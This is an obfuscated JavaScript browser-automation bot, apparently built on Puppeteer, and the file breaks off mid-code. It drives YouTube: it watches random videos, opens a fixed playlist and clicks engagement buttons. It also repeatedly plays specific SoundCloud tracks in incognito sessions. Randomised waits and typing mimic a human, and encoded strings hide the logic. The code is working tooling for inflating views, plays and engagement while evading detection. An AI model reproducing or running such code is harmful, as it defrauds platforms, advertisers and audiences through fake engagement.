function d(b, c) {
  const e = a();
  return d = function(f, g) {
    f = f - (-0x268b + 0xae * 0x1d + 0x12d5);
    let h = e[f];
    return h;
  }, d(b, c);
}
const a1 = b,
  a0 = d,
  Z = c;

function getRandomInt(f, h) {
  const i = ceil(f);
  return floor(random() * (floor(h) - i + (-0x799 + -0x3 * -0x553 + -0x85f * 0x1))) + i;
}
async function createPage(f, h) {
  let i = await f['newPage']();
  return await i['setDefault' + 'Navigation' + 'Timeout'](-0x1 * -0xfa + 0x2331 + -0x242b), await i['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i;
}
async function standardGoto(f, h, i) {
  return await f['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i ? await wait(0x3170 + 0x341 * 0x7 + 0x2cf9 + (-0x49e3 + 0x5797 * 0x1 + -0x1ba * -0x1a) * random()) : await standardWaitForNetIdle(f), await wait(0x2084 + 0x13af + -0x1 * 0x20ab + (-0x45 * 0x70 + 0x3756 + 0xdea) * random()), 0x622 + -0x6 * -0x52d + -0x1 * 0x252f;
}
async function standardWaitForNetIdle(f) {
  return await wait(-0x11f8 + 0xa99 * 0x3 + 0x5b5), await f['waitForNet' + 'workIdle']({
    'idleTime': 0x1d4c,
    'timeout': 0x0
  }), 0x17f3 + -0x6e4 + -0x3b * 0x4a;
}
async function randomWait() {
  return await wait(-0x55 * 0x65 + 0x19d0 + -0x1b41 * -0x1 + (0x1e6b * -0x1 + 0x63 * 0x3 + -0x4e1 * -0xa) * random()), -0x1c72 + -0x2c9 + 0x1f3c;
}

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (-0x268b + 0xae * 0x1d + 0x12d5);
    let h = e[f];
    if (b['VypEqx'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = 0xd7 * 0xa + -0x7fa + 0x2 * -0x36, s, t, u = 0x2 * 0xb57 + -0x222b + 0xb7d; t = n['charAt'](u++); ~t && (s = r % (-0x3 * -0x553 + -0x125f * 0x2 + 0x14c9 * 0x1) ? s * (0x16b3 + -0x98 + 0x1 * -0x15db) + t : t, r++ % (-0xd * 0x1af + 0x13a5 + -0x121 * -0x2)) ? p += String['fromCharCode'](-0x59f * -0x5 + 0x371 * 0xb + -0x40f7 & s >> (-(-0xc1c + 0xe6f + 0x251 * -0x1) * r & -0x121e + 0x1229 * -0x1 + 0x244d)) : -0x1 * -0x240f + -0x6e2 + -0x4d * 0x61) {
          t = o['indexOf'](t);
        }
        for (let v = 0xa1a + -0x3 * -0x8b4 + -0x2436, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](-0x784 + 0x1cea + 0x1 * -0x1556))['slice'](-(-0x33d * 0x5 + -0x1f69 + 0x454 * 0xb));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = 0x8d * 0x3e + 0xf39 + -0x315f,
          r, t = '';
        n = i(n);
        let u;
        for (u = -0x2c9 + -0x32a + -0x5f3 * -0x1; u < -0x14 * -0x14f + 0x18 * 0x21 + -0x1c44; u++) {
          p[u] = u;
        }
        for (u = 0x2405 + 0x1cb2 + 0x40b7 * -0x1; u < -0xecd + -0x3c * -0x17 + 0xcd * 0xd; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (-0x1 * 0x16ad + -0x1 * 0x99e + 0x214b), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = 0x25 * 0x71 + 0x2 * 0x83 + 0x5c9 * -0x3, q = -0xd76 * 0x1 + 0x1 * -0x8f9 + 0x166f;
        for (let v = -0x4 * 0x39d + 0x1f31 + -0x10bd; v < n['length']; v++) {
          u = (u + (0x1944 + 0x1637 + -0x76 * 0x67)) % (-0x4fc + -0x5e5 + -0xbe1 * -0x1), q = (q + p[u]) % (-0x1b0b + 0xf0c + -0x3 * -0x455), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (-0x3d3 + 0x1a41 + 0x1a6 * -0xd)]);
        }
        return t;
      };
      b['CZxCyU'] = m, c = arguments, b['VypEqx'] = !![];
    }
    const j = e[-0x395 * 0x6 + -0x1c87 + 0x3205],
      k = f + j,
      l = c[k];
    return !l ? (b['oRIREt'] === undefined && (b['oRIREt'] = !![]), h = b['CZxCyU'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}
async function watchRandomFrontScreenVideo(f) {
  await f['evaluate'](() => {
    var i;
    (i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('yt-core-im' + 'age--fill-' + 'parent-hei' + 'ght\x20yt-cor' + 'e-image--f' + 'ill-parent' + '-width\x20yt-' + 'core-image' + '\x20yt-core-i' + 'mage--cont' + 'ent-mode-s' + 'cale-aspec' + 't-fill\x20yt-' + 'core-image' + '--loaded'))['slice'](0x1 * 0x3aa + -0x3 * 0x7f7 + 0x1 * 0x143b, -0xb1 * 0x1f + 0x2405 + 0xe8f * -0x1), i[Math['floor'](Math['random']() * i['length'])])['setAttribu' + 'te']('id', '__scope');
  }), await randomWait(), await f['click']('#__scope'), await standardWaitForNetIdle(f);
  const h = await getMaxTime(f);
  return await wait(Math['min']((-0xb199 + -0xa4 * -0x65 + 0x1247 * 0x13) * getRandomInt(-0x1 * 0x16ad + -0x1 * 0x99e + 0x204d, 0x25 * 0x71 + 0x2 * 0x83 + 0x13d * -0xe), h)), -0xd76 * 0x1 + 0x1 * -0x8f9 + 0x1670;
}
async function getMaxTime(f) {
  return await f['evaluate'](() => {
    const h = {
      'Seconds': 0x3e8,
      'Minutes': 0xea60,
      'Hours': 0x36ee80,
      'Second': 0x3e8,
      'Minute': 0xea60,
      'Hour': 0x36ee80
    };
    let i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('ytp-progre' + 'ss-bar'))['pop']()['ariaValueT' + 'ext'],
      j = -0x4 * 0x39d + 0x1f31 + -0x10bd;
    i = i['split'](i['includes']('of') ? '\x20of\x20' : ',\x20')[0x1944 + 0x1637 + -0x76 * 0x67]['split']('\x20');
    for (let k = -0x4fc + -0x5e5 + -0xae1 * -0x1; k < i['length']; k += -0x1b0b + 0xf0c + -0x7 * -0x1b7)
      j += i[k] * h[i[k + (-0x3d3 + 0x1a41 + 0x166d * -0x1)]];
    return j;
  });
}
async function anchorAndView(f) {
  const R = d;
  log(R(0x3) + 'el\x20and\x20vie' + 'w\x20video\x20pr' + 'ocess...'), await standardGoto(f, channels['random']()), await f['click']('tp-yt-pape' + 'r-tab.styl' + 'e-scope:nt' + 'h-child(4)' + '\x20>\x20div:nth' + '-child(1)'), log('clicked\x20vi' + 'deo\x20stuff'), await standardWaitForNetIdle(f), log('page\x20netwo' + 'rk\x20idle\x20x2'), await f['evaluate'](() => {
    const j = Array['from'](document['querySelec' + 'torAll']('#contents'))['filter'](l => 'style-scop' + 'e\x20ytd-rich' + '-grid-row' == l['getAttribu' + 'te']('class'))['slice'](-0x395 * 0x6 + -0x1c87 + 0x320b)['map'](l => Array['from'](l['children']))['flat'](-0x23ae + 0x33 * 0x3b + 0x17ee)['map'](l => l['childNodes'][-0x11 * -0x11 + 0x1 * -0x1fa6 + -0x1 * -0x1e86]['childNodes'][0x19b1 + 0x3 * 0x6cb + -0x2e12]['childNodes'][0x4a * 0x34 + 0x3db + -0x12e2]['childNodes'][0xb3 * 0x17 + 0x1 * 0x10df + 0x4c * -0x6f]['childNodes'][-0x1952 + 0xe86 + -0x1 * -0xacd]);
    var k;
    return (k = j)[Math['floor'](Math['random']() * k['length'])]['setAttribu' + 'te']('id', '__hookedVi' + 'dToWatch'), j['map'](l => l['href']);
  }), await wait(getRandomInt(0x21a * -0x1 + -0x1dd + 0x7df, 0x152 + -0x35 * 0x34 + 0x1cfa)), await f['click']('#__hookedV' + 'idToWatch'), await wait(-0x71f7 + 0x3c9f + 0x6ff0);
  const h = await getMaxTime(f),
    i = Math['min']((0xfd90 + 0x8894 * 0x3 + 0xc2 * -0x236) * getRandomInt(0xf17 + 0x13d3 + 0x45d * -0x8, -0x7 * -0x3ee + -0x102e + -0xf * 0xc1), h);
  return await wait(i), 0x1 * 0x1d08 + 0x2c * -0xba + 0x1 * 0x2f1;
}
async function frontScreenActions(f) {
  return log('going\x20to\x20f' + 'ront\x20scree' + 'n\x20and\x20clic' + 'king\x20rando' + 'm\x20video...'), await standardWaitForNetIdle(f), await randomWait(), log('click\x20atte' + 'mpt...'), await f['evaluate'](() => {
    var h;
    (h = Array['from'](document['getElement' + 'sByClassNa' + 'me']('style-scop' + 'e\x20ytd-rich' + '-grid-row'))['filter'](i => 'contents' != i['id']), h[Math['floor'](Math['random']() * h['length'])])['children'][0x22c5 + -0x12b5 * 0x2 + 0x2a5]['children'][0x2 * -0x36f + -0x101a + 0x16f8]['children'][-0x2 * 0x78e + 0x792 + 0x78a * 0x1]['children'][-0x2b * 0x31 + -0xee3 + 0x21a * 0xb]['children'][0x4 * 0x773 + 0x4f * 0x1f + -0x275d]['setAttribu' + 'te']('id', 'gottemezez');
  }), await randomWait(), await f['click']('#gottemeze' + 'z'), await standardWaitForNetIdle(f), await watchRandomFrontScreenVideo(f), -0x8dc * 0x2 + -0x211f + -0x32d8 * -0x1;
}
async function searchAndView(f) {
  log('searching\x20' + 'youtube\x20re' + 'sults'), await randomWait(), await f['evaluate'](() => {
    const S = d;
    let j = Array['from'](document['querySelec' + 'torAll']('#search'));
    document['getElement' + S(0x9)]('__searchBo' + 'xReal') || j['find'](k => 'INPUT' === k['tagName'])['setAttribu' + 'te']('id', '__searchBo' + 'xReal');
  }), await f['type']('#__searchB' + 'oxReal', searchTerms['random'](), {
    'delay': 0x238f * -0x1 + 0x1af + 0x2244 + (-0x2 * -0xe87 + 0x7 * -0x530 + 0x774) * random()
  }), await wait(0x22 * 0x5 + 0x47d + -0x75 * 0x7 + (-0x1 * 0x9c8 + 0xa51 + 0xa3) * random()), await f['click']('#search-ic' + 'on-legacy'), await async function j() {
    if (!await f['evaluate'](() => Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['length']))
      return await j();
  }(), await standardWaitForNetIdle(f);
  let h = await f['evaluate'](() => {
    const k = {
        'seconds': 0x3e8,
        'minutes': 0xea60,
        'hours': 0x36ee80,
        'second': 0x3e8,
        'minute': 0xea60,
        'hour': 0x36ee80
      },
      l = (m = Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['map'](p => p['childNodes'][0x24f8 + 0x1a4f + 0x1517 * -0x3]['childNodes'][-0x2255 + 0x114a + -0x1 * -0x110c]['childNodes'][-0x13 * 0xd6 + 0x486 + -0x1 * -0xb5d]))[Math['floor'](Math['random']() * m['length'])];
    var m;
    const n = l['childNodes'][0xc11 * 0x2 + 0x1078 + 0x2895 * -0x1]['childNodes'][0xced + -0xb56 + -0x197 * 0x1]['childNodes'][-0x1 * 0x289 + 0x57c + -0x2f1]['ariaLabel'];
    return l['setAttribu' + 'te']('id', '__hookedVi' + 'dToClick'), l['scrollInto' + 'View'](),
      function(p) {
        const T = b;
        let q = p['split'](',\x20')['map'](u => u['split']('\x20'))['flat'](0x5e * 0x3b + 0xdbf + -0x2368),
          r = 0x1 * 0x184f + 0x2 * 0xb + 0x4e1 * -0x5;
        for (let u = 0x2709 + 0xfc8 + -0x36d1; u < q[T(0x2, 'K8eK')]; u += 0xb36 + 0x1 * 0xc46 + 0xa * -0x259)
          r += q[u] * k[q[u + (-0x691 + -0x20e0 + 0x1 * 0x2772)]];
        return r;
      }(n);
  });
  await wait((0x7c * 0xd4 + 0x2dd0 + 0xcd8 * -0x7) * Math['random']()), await f['click']('#__hookedV' + 'idToClick');
  let i = Math['min']((0x3a0e + -0x3 * 0x1eb7 + 0x10c77) * getRandomInt(-0x1dd8 + -0x10a * 0x7 + 0x2db * 0xd, 0x441 + 0xa24 + -0xe5b), h + (0x1f9a + -0x2e * 0xce + 0x18f2));
  return await wait(i), 0x1b78 + -0x54e * 0x4 + -0x63f;
}

function c(b, d) {
  const e = a();
  return c = function(f, g) {
    f = f - (-0x268b + 0xae * 0x1d + 0x12d5);
    let h = e[f];
    if (c['sNrKfA'] === undefined) {
      var i = function(m) {
        const n = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let o = '',
          p = '';
        for (let q = 0xd7 * 0xa + -0x7fa + 0x2 * -0x36, r, s, t = 0x2 * 0xb57 + -0x222b + 0xb7d; s = m['charAt'](t++); ~s && (r = q % (-0x3 * -0x553 + -0x125f * 0x2 + 0x14c9 * 0x1) ? r * (0x16b3 + -0x98 + 0x1 * -0x15db) + s : s, q++ % (-0xd * 0x1af + 0x13a5 + -0x121 * -0x2)) ? o += String['fromCharCode'](-0x59f * -0x5 + 0x371 * 0xb + -0x40f7 & r >> (-(-0xc1c + 0xe6f + 0x251 * -0x1) * q & -0x121e + 0x1229 * -0x1 + 0x244d)) : -0x1 * -0x240f + -0x6e2 + -0x4d * 0x61) {
          s = n['indexOf'](s);
        }
        for (let u = 0xa1a + -0x3 * -0x8b4 + -0x2436, v = o['length']; u < v; u++) {
          p += '%' + ('00' + o['charCodeAt'](u)['toString'](-0x784 + 0x1cea + 0x1 * -0x1556))['slice'](-(-0x33d * 0x5 + -0x1f69 + 0x454 * 0xb));
        }
        return decodeURIComponent(p);
      };
      c['hjrHRI'] = i, b = arguments, c['sNrKfA'] = !![];
    }
    const j = e[0x8d * 0x3e + 0xf39 + -0x315f],
      k = f + j,
      l = b[k];
    return !l ? (h = c['hjrHRI'](h), b[k] = h) : h = l, h;
  }, c(b, d);
}
async function keyWatch(f) {
  const W = c,
    V = b,
    U = d;
  log('standard\x20k' + 'eyWatch...'), await standardGoto(f, 'https://ww' + 'w.youtube.' + 'com/watch?' + 'v=' + hookPlaylistPoints['random']() + ('&list=PL7D' + '9Ps0wVt5cy' + 'nwDE_CPYb6' + 'aBUkYyfi-y'), 0x1e16 * 0x1 + 0xa * 0x352 + 0x1 * -0x3f4a), log(U(0x12) + '.'), await f['click']('#button\x20>\x20' + 'ytd-button' + '-renderer\x20' + '>\x20yt-butto' + 'n-shape\x20>\x20' + 'button\x20>\x20y' + 't-touch-fe' + 'edback-sha' + 'pe\x20>\x20div\x20>' + '\x20div.yt-sp' + 'ec-touch-f' + 'eedback-sh' + 'ape__fill'), await f['click']('#top-level' + '-buttons-c' + 'omputed\x20>\x20' + 'ytd-toggle' + '-button-re' + 'nderer\x20>\x20y' + 't-button-s' + V(0x25, 'KDrb') + 'ton\x20>\x20yt-t' + 'ouch-feedb' + 'ack-shape\x20' + '>\x20div\x20>\x20di' + W(0xf) + 'touch-feed' + 'back-shape' + '__fill');
  const h = setInterval(async () => {
    log('executed\x20c' + 'leanup\x20int' + 'erval,\x20che' + 'ck\x20process' + '...'), await f['evaluate'](() => {
      setTimeout(() => {
        document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')?.['offsetPare' + 'nt'] && document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')['setAttribu' + 'te']('id', '__lllll');
      }, -0xc17 + 0x601 * 0x6 + -0xc37 + (-0x16b0 + 0x585 * 0x2 + 0x16 * 0xb5) * Math['random']());
    });
  }, -0x206f * 0x1 + -0x11d + 0x3ce4);
  await wait(-0x3 * -0x2759d + 0x1 * -0x8ab3 + -0x24244);
  try {
    await f['click']('#__lllll');
  } catch (i) {}
  return await wait((-0x8304 + 0x12c5d + 0x4107) * getRandomInt(-0xf00 * 0x1 + -0x605 + 0x703 * 0x3, 0x168d * 0x1 + -0x1b16 + 0x4a2)), clearInterval(h), 0x35 * -0x86 + -0x303 * 0xb + 0x3ce0;
}
async function runYTModule(f, h) {
  const i = await createPage(f, 'https://ww' + 'w.youtube.' + 'com/');
  for (await randomWait();;) {
    let j = -0x10e4 + 0x23 * 0x118 + -0x1564;
    try {
      await standardWaitForNetIdle(i), await GlobalActions['random']()(i);
    } catch (k) {
      i['close']();
    }
    if (j)
      return -0x15d * -0x19 + 0x1 * 0x846 + -0x2a5a;
    await randomWait();
  }
  return 0x26 * 0xd4 + 0x1ec9 + -0x3e40;
}

function fetchRandomSC() {
  return Math['random']() <= -0x1ee * 0x11 + -0x3 * 0x7ed + 0xb51 * 0x5 + 0.5 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'long-day-r' + 'emix-prod-' + 'unnecessar' + 'y-beats?si' + '=30458c9ce' + '44c4b4eaab' + '8a3eca1b3a' + '58e&utm_so' + 'urce=clipb' + 'oard&utm_m' + 'edium=text' + '&utm_campa' + 'ign=social' + '_sharing' : Math['random']() < 0x2582 + -0x24d4 * -0x1 + -0x4a56 + 0.2 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'whatnot-de' + 'mo?si=cf08' + 'c07128594b' + 'f6b3d049e1' + '680b972f&u' + 'tm_source=' + 'clipboard&' + 'utm_medium' + '=text&utm_' + 'campaign=s' + 'ocial_shar' + 'ing' : 'https://so' + 'undcloud.c' + 'om/22down/' + 'worried-ab' + 'out-the-tr' + 'uth-ft-rik' + 'anbeastly-' + 'nikkkq-cas' + 'ualcheater' + '?si=20d1c3' + '32655b4ef1' + '98a379eac0' + '05725b&utm' + '_source=cl' + 'ipboard&ut' + 'm_medium=t' + 'ext&utm_ca' + 'mpaign=soc' + 'ial_sharin' + 'g';
}
async function runGFModule(f, h) {
  async function i() {
    if (doFlags['doSoundClo' + 'ud'] && Math['random']() >= -0x8ef + -0x1 * 0x2039 + 0xa4a * 0x4 + 0.3) {
      const j = await f['createInco' + 'gnitoBrows' + 'erContext'](),
        k = await j['newPage']();
      let l = 0xafc + 0x1 * -0x775 + -0x7 * 0x81;
      if (await k['goto'](fetchRandomSC(), {
          'timeout': NETWORK_PATIENCE
        })['catch'](m => l++), l)
        return await k['close'](), await j['close'](), i();
      try {
        const m = await k['evaluate'](() => {
          let n = document['querySelec' + 'tor']('#content\x20>' + '\x20div\x20>\x20div' + '.l-listen-' + 'hero\x20>\x20div' + '\x20>\x20div.ful' + 'lHero__for' + 'eground.fu' + 'llListenHe' + 'ro__foregr' + 'ound.sc-p-' + '4x\x20>\x20div.f' + 'ullHero__t' + 'itle\x20>\x20div' + '\x20>\x20div\x20>\x20d' + 'iv.soundTi' + 'tle__playB' + 'utton.soun' + 'dTitle__pl' + 'ayButtonHe' + 'ro.theme-l' + 'ight\x20>\x20a');
          n && 'Play' === n['textConten' + 't'] && n['click']();
        });
        await wait(-0x62 * -0x93 + 0x1 * 0x63c4 + 0x13be + getRandomInt(-0x4d29 * -0x1 + 0x1d33 + 0x2 * -0x17e2, 0x9c97 + 0xb319 + 0x1b5 * -0x80));
      } catch (n) {}
      return await k['close'](), await j['close'](), i();
    } {
      const {
        url: p,
        preRef: q
      } = scriptTargets['randomFlus' + 'h'](0x7b * 0x1 + 0x9d1 + -0x1 * 0xa4b), r = await f['createInco' + 'gnitoBrows' + 'erContext'](), s = await r['newPage']();
      let u = -0x527 * 0x1 + 0x16d * 0xd + 0x6b1 * -0x2;
      if (await s['goto'](q, {
          'timeout': NETWORK_PATIENCE
        })['catch'](w => u++), u)
        return await s['close'](), await r['close'](), i();
      const v = await s['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
      return log(v['slice'](-0xc7 * 0x1d + -0x19a0 + 0x302b, 0xd06 * 0x2 + -0x26f5 + 0xb * 0x131)), v['includes']('script-des' + 'cription') ? (log('p1'), await s['goto'](p, {
        'timeout': NETWORK_PATIENCE
      })['catch'](w => u++), u ? (await s['close'](), await r['close'](), i()) : (await new Promise(w => setTimeout(w, -0xa38 + 0x1 * 0x20ac + -0xea4 + floor((-0x1 * 0x8a7 + -0x1012 * 0x1 + -0x417 * -0x7) * random()))), log('p2'), log(await s['evaluate'](() => {
        const Y = c;
        var w, x, y, z, A, B, C, D, E = 'object' == typeof window ? window : {},
          F = !E['JS_SHA1_NO' + '_NODE_JS'] && 'object' == typeof process && process['versions'] && process['versions']['node'];
        F && (E = global), w = ('0123456789' + 'abcdef')['split'](''), x = [
          -(-0xff8894e6 + -0x924f29ca + 0x211d7beb0 * 0x1),
          -0x23b179 * -0x5 + -0x482b46 + 0x3b * 0x5e2b,
          0x9cfc + 0x8d31 * -0x1 + 0x7035,
          -0x16f6 + 0x2 * 0x938 + -0x506 * -0x1
        ], y = [
          -0x55c * 0x1 + -0x1 * -0x1f2d + -0x19b9,
          -0x78f + -0xb1f * 0x2 + 0x1ddd,
          0x174 + -0x1d99 * -0x1 + -0x1f05,
          0x2 * 0x445 + -0x29c + -0x5ee
        ], z = [
          'hex',
          'array',
          'digest',
          'arrayBuffe' + 'r'
        ], A = [], B = function(J) {
          return function(K) {
            return new G(-0x292 + 0x107 * 0xf + -0xcd6)['update'](K)[J]();
          };
        }, C = function() {
          var J, K, L = B('hex');
          for (F && (L = D(L)), L['create'] = function() {
              return new G();
            }, L['update'] = function(M) {
              return L['create']()['update'](M);
            }, J = 0xaab + -0x1 * 0x9e1 + -0xca; J < z['length']; ++J)
            K = z[J], L[K] = B(K);
          return L;
        }, D = function(J) {
          var K = eval('require(\'crypto\');'),
            L = eval('require(\'buffer\')[\'Buffer\'];'),
            M = function(N) {
              if ('string' == typeof N)
                return K['createHash']('sha1')['update'](N, 'utf8')['digest']('hex');
              if (N['constructo' + 'r'] === ArrayBuffer)
                N = new Uint8Array(N);
              else {
                if (void(-0x2ce * -0x8 + -0x1 * -0x1553 + -0x2bc3) === N['length'])
                  return J(N);
              }
              return K['createHash']('sha1')['update'](new L(N))['digest']('hex');
            };
          return M;
        };
        class G {
          constructor(J) {
              J ? (A[0x1976 + -0x262e + 0xcb8] = A[0x16cb + 0x1 * 0xd13 + -0x23ce] = A[-0x1ed3 + 0x4e1 * -0x1 + -0x23b5 * -0x1] = A[0x1c48 + -0x761 * 0x2 + -0xd84] = A[0x2025 + -0x23b + -0x5fb * 0x5] = A[-0x16 * 0xf4 + 0x1c53 + -0x757 * 0x1] = A[0x1a6 * -0x1 + 0x949 * 0x3 + 0x1 * -0x1a30] = A[-0x172f + -0x26d * -0x3 + 0xfee] = A[0xda * -0x15 + 0x50e + -0xcdb * -0x1] = A[0x152 + -0x1592 + 0x1448] = A[0x1931 + 0x1be1 + -0x3509] = A[0x104a + 0x23ea * -0x1 + 0x13aa] = A[0x131f + -0x692 + -0xc82] = A[-0x23da + 0x1873 + 0xb73] = A[-0x27 * 0x1c + -0xc39 + 0x108a] = A[-0x1 * 0x137b + 0x5 * -0x4c7 + 0x1c * 0x18d] = A[-0xc65 + -0x5f8 + -0x3 * -0x624] = -0x18ef + 0xf29 + -0x6 * -0x1a1, this['blocks'] = A) : this['blocks'] = [
                0x79b * 0x1 + -0x8df + 0x144,
                0x17b0 + -0x45b + -0x65 * 0x31,
                -0xf12 * -0x1 + 0x1943 + -0x2855,
                -0x19 * 0xd3 + 0x1904 + 0x1 * -0x469,
                0x1f11 + 0x15b * 0x13 + 0x81e * -0x7,
                -0xd * 0x1fc + -0x564 + -0x2 * -0xf98,
                0x540 + 0xbfa + -0x12 * 0xf5,
                0x27 * 0x4f + -0x4 * 0x74d + 0x112b,
                0x2e * -0x18 + -0x2 * 0x7e1 + -0xe * -0x16f,
                0x8a * 0x2f + 0x6 * -0x2de + -0x822,
                0x187a + 0x2 * -0xf7c + 0x67e,
                -0xac6 + 0x137a + -0x8b4,
                0xb2b * -0x3 + 0x1 * -0xcaa + -0xdf * -0x35,
                0x1 * -0x1897 + -0x118c + 0xa1 * 0x43,
                -0x3fe + -0x40a * 0x8 + -0x2 * -0x1227,
                -0x1795 * 0x1 + 0xda5 * 0x1 + 0x9f0,
                -0xb35 * 0x2 + 0x1 * 0x1763 + -0x53 * 0x3
              ], this['h0'] = -0x1 * -0x43cb3f47 + -0x9701a90b + -0xaf83575 * -0x11, this['h1'] = -0x9250bb4f + 0x1ca853543 * 0x1 + -0x4866ce6b, this['h2'] = 0x78543c8d + -0x23082b97 + 0x436ecc08, this['h3'] = -0xc887537 + -0x2a8b * -0x44e7 + -0x8a3bd2 * -0x20, this['h4'] = 0x1269e7c25 + 0x1847078e3 + -0x61726a38 * 0x5, this['block'] = this['start'] = this['bytes'] = this['hBytes'] = -0xdb0 + -0x45a * -0x7 + -0x10c6, this['finalized'] = this['hashed'] = -0x1 * -0xd + -0x13ed + 0x1a8 * 0xc, this['first'] = -0x1 * -0x1155 + -0x19ee + 0x89a;
            }
            ['update'](J) {
              var K, L, M, N, O, P;
              if (!this['finalized']) {
                for ((K = 'string' != typeof J) && J['constructo' + 'r'] === E['ArrayBuffe' + 'r'] && (J = new Uint8Array(J)), M = -0x1 * -0x1509 + 0x76b + 0x4 * -0x71d, O = J['length'] || 0x27b * 0xb + 0x3 * 0xb57 + 0x7 * -0x8c2, P = this['blocks']; M < O;) {
                  if (this['hashed'] && (this['hashed'] = 0x3 * -0x3ed + -0x22f5 * -0x1 + -0x172e, P[0x93f + -0xfad + -0x1 * -0x66e] = this['block'], P[-0x11 * -0xe + -0x954 + 0x876] = P[-0x812 * -0x1 + -0x1d * -0x13d + -0x1b1 * 0x1a] = P[-0x213 + -0x22c5 + 0x24da] = P[0x16b0 + -0xa92 * 0x2 + -0x1 * 0x189] = P[0x8 * 0x161 + -0x17d * 0x2 + -0x93 * 0xe] = P[0x1 * 0x129f + 0x93b + -0xf * 0x1db] = P[-0x1392 + 0x24c3 + 0x36f * -0x5] = P[-0x2ce * -0x1 + -0x10 * -0x17e + -0x1aa7] = P[0x2255 * -0x1 + 0x1c4b + 0x612] = P[-0x24a9 * 0x1 + -0x8d8 * 0x4 + 0x4812] = P[-0x23b1 * -0x1 + -0x2d * 0x39 + -0x19a2] = P[-0x2a9 * 0x5 + -0xcd * 0x25 + -0x13 * -0x243] = P[0x1908 + 0x1b4a + -0x3446 * 0x1] = P[0x862 * -0x2 + -0x19c7 + 0x2a98] = P[-0x4b3 + -0xb3 * -0x15 + -0x9ee] = P[-0x19c * -0x18 + -0x2 * -0x4f7 + -0xd * 0x3bb] = -0x123 + 0x13f8 + -0x12d5), K) {
                    for (N = this['start']; M < O && N < 0x6da * 0x1 + 0x1 * 0xe74 + -0x1ea * 0xb; ++M)
                      P[N >> -0x1f1a + 0x1 * -0x354 + -0x130 * -0x1d] |= J[M] << y[0x1 * -0x32d + 0xca9 + -0x979 * 0x1 & N++];
                  } else {
                    for (N = this['start']; M < O && N < -0x2110 + 0xcb5 * -0x1 + 0x2e05; ++M)
                      (L = J['charCodeAt'](M)) < -0x2031 * -0x1 + -0x89 * -0x15 + -0x2aee ? P[N >> -0xf6 * 0xb + 0x236 + 0x85e] |= L << y[0x10a7 + -0x13d5 + 0x13 * 0x2b & N++] : L < -0xd4f + 0x83c + 0xd13 ? (P[N >> -0x1 * -0x56f + -0x1c36 + 0x16c9] |= (0x1 * 0x11c5 + 0xf1f + -0x2024 | L >> -0x200f + -0xf * 0x13 + 0x2132) << y[-0x40c * -0x4 + 0x1 * -0x240 + -0xded * 0x1 & N++], P[N >> 0x3 * -0x31d + -0x11 * -0x162 + -0xe29] |= (0x22b0 + 0x307 * -0x9 + -0x6f1 | -0x6b * -0x1 + -0x1091 + -0x577 * -0x3 & L) << y[0x1066 + 0x266e + 0x36d1 * -0x1 & N++]) : L < -0xb6da + -0x7 * -0x11dd + 0x111cf || L >= -0x253 * -0xbe + 0x7f8b * -0x1 + -0x5a0f ? (P[N >> -0x1 * 0x1669 + 0x24fd + -0x2ea * 0x5] |= (0xc58 + -0x24df * -0x1 + -0x3057 | L >> -0x84e + -0x172a + 0x1f84) << y[0xcea + -0xc19 * -0x3 + -0x3132 * 0x1 & N++], P[N >> -0x4cd * 0x8 + -0x29 * -0x9e + -0x347 * -0x4] |= (-0x1 * 0x107b + 0x23ac + 0x13f * -0xf | L >> -0x7a0 + -0x2c * -0xe0 + -0x1eda & 0x4cd * 0x1 + 0x2cc * -0xa + -0x29a * -0x9) << y[-0x6ff * -0x2 + 0x1 * -0x25d0 + 0x17d5 & N++], P[N >> 0x185 * 0x15 + -0xbf6 * 0x3 + -0x3fb * -0x1] |= (0x1 * 0x1b9d + 0x247c + -0x3f99 | -0x128f + 0x1d3b + 0x1 * -0xa6d & L) << y[-0x14ea * 0x1 + -0x718 + -0x1c05 * -0x1 & N++]) : (L = -0xb2af + -0x15e96 + -0x1 * -0x31145 + ((-0x9e0 + -0x25f6 + 0x33d5 & L) << -0x9 * -0x181 + -0x3ff + -0x980 | -0x1 * 0x25e + -0x649 + 0x2 * 0x653 & J['charCodeAt'](++M)), P[N >> -0x1674 + 0x2228 + 0xbb2 * -0x1] |= (-0x18e1 + -0x9 * 0x4 + 0x19f5 | L >> -0x3b * -0x29 + 0x3da * -0x9 + -0x1949 * -0x1) << y[-0x192d + -0x1984 * 0x1 + -0x4 * -0xcad & N++], P[N >> 0x1b79 + 0x1 * -0x706 + -0x1 * 0x1471] |= (-0x15ff + -0xe * 0x1f6 + -0x2a1 * -0x13 | L >> -0x211a + -0x7d * -0x29 + 0xd21 & 0x2f * 0xb5 + -0x1 * -0x7b2 + 0x28ae * -0x1) << y[0x593 * -0x2 + 0x2 * 0x251 + 0x687 & N++], P[N >> 0x630 + 0x2 * -0x59d + 0x50c] |= (0x55 * -0x19 + 0xd7e * 0x1 + -0x4b1 | L >> -0x887 + 0x4c1 * -0x5 + 0x2a * 0xc5 & 0x2 * -0xdca + -0x13cb + 0x2f9e) << y[-0x151d + -0x1b6 + 0x4a * 0x4f & N++], P[N >> -0x221 * -0xc + -0xe1f + -0x1 * 0xb6b] |= 